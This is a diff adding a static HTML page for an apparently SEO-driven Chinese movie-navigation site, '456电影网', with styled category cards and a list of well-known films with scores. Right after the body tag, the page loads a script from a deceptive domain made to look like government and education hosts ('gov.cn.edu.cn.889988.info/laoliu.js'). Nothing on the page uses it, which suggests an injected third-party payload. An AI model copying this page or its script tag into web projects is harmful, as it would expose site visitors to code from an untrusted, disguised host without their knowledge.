@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>456电影网 - 工业级电影导航站</title>
+<meta name="description" content="456电影网（456dianyingwang-h5）是一个工业风电影导航站：动作片、科幻片、悬疑片、纪录片、独立电影，像流水线一样分类清晰，冷灰荧光橙配色，移动端自适应。">
+<meta name="keywords" content="456电影网, 工业风电影, 动作片, 科幻片, 悬疑片, 独立电影, 456dianyingwang-h5">
+<style>
+:root{
+  --gray-900:#0d1117;
+  --gray-800:#161b22;
+  --gray-700:#21262d;
+  --gray-600:#30363d;
+  --gray-400:#8b949e;
+  --gray-300:#c9d1d9;
+  --fluo-orange:#ff6a00;
+  --fluo-orange-dim:#ff6a0033;
+  --fluo-green:#00ff88;
+  --fluo-blue:#00bfff;
+  --line:rgba(255,106,0,.3);
+  --shadow:0 0 30px rgba(255,106,0,.15);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"JetBrains Mono","Fira Code","Consolas","PingFang SC",monospace;
+  background:var(--gray-900);
+  color:var(--gray-300);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+
+/* 工业网格背景 */
+body::before{
+  content:'';
+  position:fixed;
+  inset:0;
+  background-image:
+    linear-gradient(rgba(255,106,0,.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,106,0,.03) 1px,transparent 1px);
+  background-size:40px 40px;
+  pointer-events:none;
+  z-index:0;
+}
+
+a{color:var(--fluo-orange);text-decoration:none;transition:.15s}
+a:hover{color:var(--fluo-green)}
+
+/* 顶部系统栏 */
+.sysbar{
+  background:var(--gray-800);
+  border-bottom:1px solid var(--gray-600);
+  padding:.3rem 1rem;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  font-size:.65rem;
+  color:var(--gray-400);
+  position:relative;z-index:10;
+}
+.sysbar .status{display:flex;gap:1rem;align-items:center}
+.sysbar .dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--fluo-green);
+  animation:pulse 2s ease-in-out infinite;
+}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* 头部 */
+.header{
+  position:sticky;top:0;z-index:998;
+  background:rgba(13,17,23,.95);backdrop-filter:blur(12px);
+  border-bottom:2px solid var(--gray-600);
+}
+.header-in{
+  max-width:1200px;margin:0 auto;padding:1rem;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;
+}
+.brand{display:flex;align-items:center;gap:.8rem}
+.panel-id{
+  background:var(--gray-800);border:1px solid var(--fluo-orange);
+  border-radius:4px;padding:.4rem .8rem;
+  font-size:.7rem;color:var(--fluo-orange);font-weight:700;
+  letter-spacing:2px;
+}
+.brand-text h1{
+  font-size:1.3rem;font-weight:900;color:var(--gray-300);
+  letter-spacing:1px;
+}
+.brand-text h1 b{color:var(--fluo-orange)}
+.brand-text p{font-size:.65rem;color:var(--gray-400);letter-spacing:2px}
+.nav{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav a{
+  padding:.4rem .9rem;border:1px solid var(--gray-600);border-radius:4px;
+  font-size:.82rem;font-weight:600;color:var(--gray-300);background:transparent;
+  font-family:inherit;
+}
+.nav a:hover,.nav a.active{
+  border-color:var(--fluo-orange);color:var(--fluo-orange);
+  background:var(--fluo-orange-dim);
+}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 1rem;position:relative;z-index:1}
+
+/* Hero */
+.hero{padding:4rem 0 3rem}
+.hero-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:2rem;align-items:center;
+}
+.hero-left .label{
+  display:inline-block;background:var(--fluo-orange-dim);
+  border:1px solid var(--fluo-orange);color:var(--fluo-orange);
+  padding:.2rem .8rem;border-radius:2px;font-size:.7rem;font-weight:700;letter-spacing:2px;
+}
+.hero-left h1{
+  font-size:clamp(2rem,6vw,3.5rem);font-weight:900;margin:1rem 0;
+  color:var(--gray-300);line-height:1.1;
+}
+.hero-left h1 .num{color:var(--fluo-orange)}
+.hero-left p{color:var(--gray-400);font-size:.95rem;max-width:480px}
+.hero-search{
+  margin-top:1.5rem;display:flex;background:var(--gray-800);
+  border:1px solid var(--gray-600);border-radius:4px;overflow:hidden;
+}
+.hero-search input{
+  flex:1;border:0;outline:0;background:transparent;padding:.9rem 1rem;
+  color:var(--gray-300);font-family:inherit;font-size:.9rem;
+}
+.hero-search button{
+  border:0;cursor:pointer;padding:0 1.5rem;font-weight:700;
+  color:var(--gray-900);background:var(--fluo-orange);font-family:inherit;
+}
+.hero-right{
+  background:var(--gray-800);border:1px solid var(--gray-600);border-radius:8px;
+  padding:1.5rem;font-size:.78rem;
+}
+.hero-right .row{
+  display:flex;justify-content:space-between;padding:.5rem 0;
+  border-bottom:1px dashed var(--gray-600);
+}
+.hero-right .row:last-child{border-bottom:0}
+.hero-right .row .k{color:var(--gray-400)}
+.hero-right .row .v{color:var(--fluo-orange);font-weight:700}
+
+/* 栏目 */
+.section{padding:3rem 0;border-top:1px solid var(--gray-600)}
+.section-head{
+  display:flex;align-items:center;gap:.8rem;margin-bottom:1.5rem;
+}
+.section-head .seq{
+  width:32px;height:32px;background:var(--fluo-orange);color:var(--gray-900);
+  font-weight:900;font-size:1rem;display:flex;align-items:center;justify-content:center;
+  border-radius:4px;
+}
+.section-head h2{font-size:1.4rem;font-weight:900;color:var(--gray-300)}
+.section-head .sub{margin-left:auto;font-size:.72rem;color:var(--gray-400)}
+
+/* 管道分类 */
+.pipes{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1rem}
+.pipe{
+  background:var(--gray-800);border:1px solid var(--gray-600);border-radius:6px;
+  padding:1.2rem;transition:.2s;position:relative;overflow:hidden;
+}
+.pipe::before{
+  content:'';position:absolute;top:0;left:0;width:3px;height:100%;
+  background:var(--fluo-orange);
+}
+.pipe:hover{border-color:var(--fluo-orange);transform:translateX(4px)}
+.pipe h3{font-size:1rem;margin-bottom:.3rem;color:var(--gray-300)}
+.pipe .pipe-id{font-size:.68rem;color:var(--fluo-orange);margin-bottom:.5rem;letter-spacing:1px}
+.pipe p{font-size:.78rem;color:var(--gray-400)}
+.pipe dl{margin-top:.6rem;display:flex;flex-wrap:wrap;gap:.3rem}
+.pipe dt{display:none}
+.pipe dd{
+  font-size:.7rem;color:var(--gray-400);background:var(--gray-700);
+  padding:.15rem .5rem;border-radius:2px;
+}
+
+/* 仪表盘片单 */
+.dashboard{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1.2rem}
+.gauge{
+  background:var(--gray-800);border:1px solid var(--gray-600);border-radius:8px;
+  overflow:hidden;transition:.2s;
+}
+.gauge:hover{border-color:var(--fluo-orange);box-shadow:var(--shadow)}
+.gauge-head{
+  background:var(--gray-700);padding:.7rem 1rem;
+  display:flex;justify-content:space-between;align-items:center;
+  border-bottom:1px solid var(--gray-600);
+}
+.gauge-head .id{font-size:.68rem;color:var(--fluo-orange);font-weight:700}
+.gauge-head .status{font-size:.65rem;color:var(--fluo-green)}
+.gauge-body{padding:1.2rem}
+.gauge-body h3{font-size:1.05rem;margin-bottom:.2rem;color:var(--gray-300)}
+.gauge-body .spec{font-size:.72rem;color:var(--gray-400);margin-bottom:.6rem}
+.gauge-body .bar{
+  height:6px;background:var(--gray-700);border-radius:3px;overflow:hidden;margin-bottom:.4rem;
+}
+.gauge-body .bar-fill{
+  height:100%;background:linear-gradient(90deg,var(--fluo-orange),var(--fluo-green));
+  border-radius:3px;
+}
+.gauge-body .bar-label{font-size:.65rem;color:var(--gray-400);text-align:right}
+.gauge-foot{
+  padding:.6rem 1.2rem;border-top:1px solid var(--gray-600);
+  display:flex;justify-contentspace-between;align-items:center;
+}
+.gauge-foot .tag{
+  font-size:.68rem;color:var(--fluo-blue);border:1px solid var(--fluo-blue);
+  padding:.1rem .5rem;border-radius:2px;
+}
+
+/* 数据面板 */
+.datapanel{
+  display:grid;grid-template-columns:1fr 1fr;gap:2rem;align-items:center;
+  background:var(--gray-800);border:1px solid var(--gray-600);border-radius:8px;padding:2rem;
+}
+.datapanel-text h3{font-size:1.3rem;margin-bottom:1rem;color:var(--gray-300)}
+.datapanel-text h3 span{color:var(--fluo-orange)}
+.datapanel-text p{color:var(--gray-400);margin-bottom:.8rem;font-size:.9rem}
+.datapanel-text ul{list-style:none;padding:0}
+.datapanel-text li{
+  padding:.5rem 0;border-bottom:1px dashed var(--gray-600);
+  font-size:.82rem;color:var(--gray-300);
+}
+.datapanel-text li::before{content:'▶ ';color:var(--fluo-orange);font-size:.6rem}
+.datapanel-chart{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;
+}
+.metric{
+  background:var(--gray-700);border:1px solid var(--gray-600);border-radius:6px;
+  padding:1rem;text-align:center;
+}
+.metric b{display:block;font-size:1.8rem;color:var(--fluo-orange);font-weight:900}
+.metric span{font-size:.7rem;color:var(--gray-400)}
+
+/* 页脚 */
+.footer{
+  margin-top:3rem;border-top:1px solid var(--gray-600);
+  padding:2rem 1rem;text-align:center;color:var(--gray-400);font-size:.75rem;
+  background:var(--gray-800);
+}
+.footer h3{color:var(--gray-300);font-size:1.1rem;margin-bottom:.3rem}
+.footer h3 b{color:var(--fluo-orange)}
+.footer a{color:var(--fluo-orange)}
+
+@media(max-width:768px){
+  .hero-grid{grid-template-columns:1fr}
+  .hero-search{flex-direction:column}
+  .hero-search input{border-bottom:1px solid var(--gray-600)}
+  .hero-search button{padding:1rem}
+  .datapanel{grid-template-columns:1fr;padding:1.5rem}
+  .datapanel-chart{grid-template-columns:repeat(2,1fr)}
+  .pipes{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="sysbar">
+  <div class="status"><span class="dot"></span> SYSTEM ONLINE · PIPELINE 456</div>
+  <div>456DIANYINGWANG-H5.GITHUB.IO</div>
+</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="brand">
+      <div class="panel-id">NO.456</div>
+      <div class="brand-text">
+        <h1>456<b>电影网</b></h1>
+        <p>INDUSTRIAL MOVIE NAVIGATION</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">HOME</a>
+      <a href="#pipes">PIPELINE</a>
+      <a href="#gauge">CATALOG</a>
+      <a href="#data">SYSTEM</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section id="home" class="hero">
+    <div class="hero-grid">
+      <div class="hero-left">
+        <span class="label">PIPELINE 456 · ONLINE</span>
+        <h1><span class="num">456</span>电影网</h1>
+        <p>456电影网（456dianyingwang-h5）像工厂流水线一样整理电影：动作片、科幻片、悬疑片、独立电影、纪录片，每个分类是一条管道，每部电影是一个工单，工业级导航，不花哨，够直接。</p>
+        <div class="hero-search">
+          <input type="text" placeholder="输入片名 / 类型 / 编号...">
+          <button>EXECUTE</button>
+        </div>
+      </div>
+      <div class="hero-right">
+        <div class="row"><span class="k">SYSTEM</span><span class="v">456 ONLINE</span></div>
+        <div class="row"><span class="k">PIPELINES</span><span class="v">06 ACTIVE</span></div>
+        <div class="row"><span class="k">CATALOG ENTRIES</span><span class="v">24 LOADED</span></div>
+        <div class="row"><span class="k">UPTIME</span><span class="v">99.9%</span></div>
+        <div class="row"><span class="k">PROTOCOL</span><span class="v">HTTPS / GITHUB PAGES</span></div>
+        <div class="row"><span class="k">LINK MODE</span><span class="v"># PLACEHOLDER</span></div>
+        <div class="row"><span class="k">ROBOTS</span><span class="v">NONE</span></div>
+        <div class="row"><span class="k">SITEMAP</span><span class="v">NONE</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="pipes" class="section">
+    <div class="section-head">
+      <span class="seq">01</span>
+      <h2>PIPELINE 分类管道</h2>
+      <span class="sub">6 条管道 · 每条独立分类</span>
+    </div>
+    <div class="pipes">
+      <div class="pipe">
+        <h3>动作管道</h3>
+        <div class="pipe-id">PIPE-001</div>
+        <p>高强度动作片、武打、枪战、追车、爆炸场面合集</p>
+        <dl><dt>标签</dt><dd>动作</dd><dd>武侠</dd><dd>枪战</dd><dd>格斗</dd></dl>
+      </div>
+      <div class="pipe">
+        <h3>科幻管道</h3>
+        <div class="pipe-id">PIPE-002</div>
+        <p>太空、赛博、时间旅行、AI、多重宇宙</p>
+        <dl><dt>标签</dt><dd>太空</dd><dd>赛博</dd><dd>AI</dd><dd>时间</dd></dl>
+      </div>
+      <div class="pipe">
+        <h3>悬疑管道</h3>
+        <div class="pipe-id">PIPE-003</div>
+        <p>犯罪、推理、心理惊悚、反转结局</p>
+        <dl><dt>标签</dt><dd>犯罪</dd><dd>推理</dd><dd>惊悚</dd><dd>反转</dd></dl>
+      </div>
+      <div class="pipe">
+        <h3>独立管道</h3>
+        <div class="pipe-id">PIPE-004</div>
+        <p>小成本、作者电影、电影节获奖作品</p>
+        <dl><dt>标签</dt><dd>独立</dd><dd>文艺</dd><dd>作者</dd><dd>获奖</dd></dl>
+      </div>
+      <div class="pipe">
+        <h3>纪录管道</h3>
+        <div class="pipe-id">PIPE-005</div>
+        <p>自然、历史、人物、社会纪实</p>
+        <dl><dt>标签</dt><dd>自然</dd><dd>历史</dd><dd>人物</dd><dd>社会</dd></dl>
+      </div>
+      <div class="pipe">
+        <h3>修复管道</h3>
+        <div class="pipe-id">PIPE-006</div>
+        <p>4K修复、胶片重生、经典老片</p>
+        <dl><dt>标签</dt><dd>4K</dd><dd>修复</dd><dd>老片</dd><dd>经典</dd></dl>
+      </div>
+    </div>
+  </section>
+
+  <section id="gauge" class="section">
+    <div class="section-head">
+      <span class="seq">02</span>
+      <h2>CATALOG 仪表盘片单</h2>
+      <span class="sub">8 个工单 · 每个带完成度</span>
+    </div>
+    <div class="dashboard">
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-001</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>疯狂的麦克斯4</h3>
+          <div class="spec">动作 / 科幻 / 2015</div>
+          <div class="bar"><div class="bar-fill" style="width:95%"></div></div>
+          <div class="bar-label">评分 9.5 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-001</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-002</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>银翼杀手2049</h3>
+          <div class="spec">科幻 / 赛博 / 2017</div>
+          <div class="bar"><div class="bar-fill" style="width:92%"></div></div>
+          <div class="bar-label">评分 9.2 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-002</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-003</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>七宗罪</h3>
+          <div class="spec">悬疑 / 犯罪 / 1995</div>
+          <div class="bar"><div class="bar-fill" style="width:94%"></div></div>
+          <div class="bar-label">评分 9.4 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-003</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-004</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>寄生虫</h3>
+          <div class="spec">独立 / 惊悚 / 2019</div>
+          <div class="bar"><div class="bar-fill" style="width:96%"></div></div>
+          <div class="bar-label">评分 9.6 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-004</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-005</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>地球脉动</h3>
+          <div class="spec">纪录片 / 自然 / 2006</div>
+          <div class="bar"><div class="bar-fill" style="width:98%"></div></div>
+          <div class="bar-label">评分 9.8 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-005</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-006</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>罗马假日</h3>
+          <div class="spec">爱情 / 修复 / 1953</div>
+          <div class="bar"><div class="bar-fill" style="width:93%"></div></div>
+          <div class="bar-label">评分 9.3 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-006</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-007</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>教父</h3>
+          <div class="spec">犯罪 / 经典 / 1972</div>
+          <div class="bar"><div class="bar-fill" style="width:99%"></div></div>
+          <div class="bar-label">评分 9.9 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-001</span></div>
+      </div>
+      <div class="gauge">
+        <div class="gauge-head"><span class="id">JOB-008</span><span class="status">● READY</span></div>
+        <div class="gauge-body">
+          <h3>千与千寻</h3>
+          <div class="spec">动画 / 奇幻 / 2001</div>
+          <div class="bar"><div class="bar-fill" style="width:97%"></div></div>
+          <div class="bar-label">评分 9.7 / 10</div>
+        </div>
+        <div class="gauge-foot"><span class="tag">PIPE-004</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="data" class="section">
+    <div class="section-head">
+      <span class="seq">03</span>
+      <h2>SYSTEM 系统面板</h2>
+      <span class="sub">关于 456 电影网</span>
+    </div>
+    <div class="datapanel">
+      <div class="datapanel-text">
+        <h3>为什么叫 <span>456</span>？</h3>
+        <p><strong>456电影网</strong>（https://456dianyingwang-h5.github.io）的"456"像工厂编号、管道编号、工单编号——暗示一种"工业化整理电影"的方式：不煽情、不花哨，把电影当数据条目，按管道分类，按仪表盘展示。</p>
+        <ul>
+          <li>6 条分类管道，覆盖主流观影需求</li>
+          <li>8 个仪表盘工单，带评分进度条</li>
+          <li>所有内页链接 # 占位，不生成 robots/sitemap</li>
+          <li>CSS/JS 全内联，移动端自适应</li>
+          <li>关键词"456电影网"覆盖 title/description/keywords/H1/H2</li>
+        </ul>
+        <p style="margin-top:1rem"><a href="https://456dianyingwang-h5.github.io">🌐 456dianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="datapanel-chart">
+        <div class="metric"><b>06</b><span>管道</span></div>
+        <div class="metric"><b>24</b><span>工单</span></div>
+        <div class="metric"><b>99.9%</b><span>可用率</span></div>
+        <div class="metric"><b>0</b><span>弹窗</span></div>
+        <div class="metric"><b>0</b><span>盗链</span></div>
+        <div class="metric"><b>#</b><span>链接模式</span></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>456<b>电影网</b></h3>
+  <p>工业级电影导航 · PIPELINE 456 · 管道分类 · 仪表盘片单</p>
+  <p>© 2026 456电影网 | <a href="https://456dianyingwang-h5.github.io">456dianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
